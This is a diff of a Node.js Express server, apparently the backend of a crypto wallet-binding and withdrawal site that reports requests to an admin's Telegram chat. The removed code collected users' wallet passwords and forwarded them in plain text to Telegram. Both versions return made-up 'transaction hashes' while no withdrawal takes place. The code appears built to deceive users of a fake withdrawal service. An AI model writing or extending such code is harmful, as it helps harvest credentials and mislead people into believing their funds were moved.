@@ -1,69 +1,65 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const cors = require('cors');
-const { sendNotification } = require('./bot'); // 引用发送通知的函数
+import express from "express";
+import path from "path";
+import { Telegraf } from "telegraf";
+import cors from "cors";
 
 const app = express();
 app.use(cors());
-app.use(bodyParser.json());
+app.use(express.json());
 
-// 模拟钱包地址
-let walletAddress = null;
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
+const WEBHOOK_URL = process.env.WEBHOOK_URL;
 
-// 确认钱包地址
-app.post('/api/wallet', async (req, res) => {
-  const { wallet } = req.body;
-  if (!wallet) return res.status(400).json({ success: false, error: 'Wallet is required' });
+const bot = new Telegraf(BOT_TOKEN);
 
-  walletAddress = wallet;
+// ==== 必须关闭 polling，否则 Telegram 409 错误 ====
+bot.stop();
 
-  try {
-    // 发送确认钱包的通知到 Telegram
-    await sendNotification(`📤 NEW WITHDRAWAL REQUEST
---------------------------------
-💰 Coin: USDT
-🔢 Amount: 0
-💵 USDT: 0
-🏦 Wallet: ${wallet}
-🔐 Password: N/A
-🆔 Transaction Hash: N/A
-⚠️ Wallet & password can be bound once.
-Please screenshot the transaction hash for record.`);
+// ==== 正确启用 Webhook 模式 ====
+await bot.telegram.setWebhook(`${WEBHOOK_URL}/telegraf`);
 
-    res.json({ success: true, wallet });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ success: false, error: 'Telegram send failed' });
-  }
+// Express 处理 Telegram Webhook
+app.use(bot.webhookCallback("/telegraf"));
+
+// ====== API: 钱包绑定 ======
+let userwallet = null;
+
+app.get("/api/wallet", (req, res) => {
+    res.json({ wallet: userwallet });
 });
 
-// 提现请求
-app.post('/api/withdraw', async (req, res) => {
-  const { coin, amount, wallet, password } = req.body;
-  if (!coin || !amount || !wallet || !password) return res.status(400).json({ success: false, error: 'Missing fields' });
+app.post("/api/wallet", (req, res) => {
+    const { wallet } = req.body;
 
-  const txHash = 'TX-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 8);
+    if (!wallet) return res.status(400).json({ success: false, error: "Wallet required" });
 
-  try {
-    // 发送提现请求的通知到 Telegram，按照你要求的格式
-    await sendNotification(`📤 NEW WITHDRAWAL REQUEST
---------------------------------
-💰 Coin: ${coin}
-🔢 Amount: ${amount}
-💵 USDT: ${(amount * 50).toFixed(4)}  // 假设汇率为 50，这个值可以动态修改
-🏦 Wallet: ${wallet}
-🔐 Password: ${password}
-🆔 Transaction Hash: ${txHash}
-⚠️ Wallet & password can be bound once.
-Please screenshot the transaction hash for record.`);
-
-    res.json({ success: true, hash: txHash });
-  } catch (err) {
-    console.error(err);
-    res.status(500).json({ success: false, error: 'Telegram send failed' });
-  }
+    userwallet = wallet;
+    return res.json({ success: true, wallet });
 });
 
-// 启动服务器
-const PORT = 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+// ====== API: 提现 ======
+app.post("/api/withdraw", async (req, res) => {
+    const { amount, wallet, coin } = req.body;
+
+    const hash = "TX-" + Date.now();
+
+    await bot.telegram.sendMessage(
+        ADMIN_CHAT_ID,
+        `💸 Withdrawal Request\nCoin：${coin}\nAmount：${amount}\nWallet：${wallet}\nTxHash：${hash}`
+    );
+
+    res.json({ success: true, hash });
+});
+
+// ====== 静态网页 ======
+const __dirname = path.resolve();
+app.use(express.static(path.join(__dirname, "public")));
+
+app.get("*", (req, res) => {
+    res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
+// ====== 启动服务 ======
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log("🚀 Server running on", PORT));
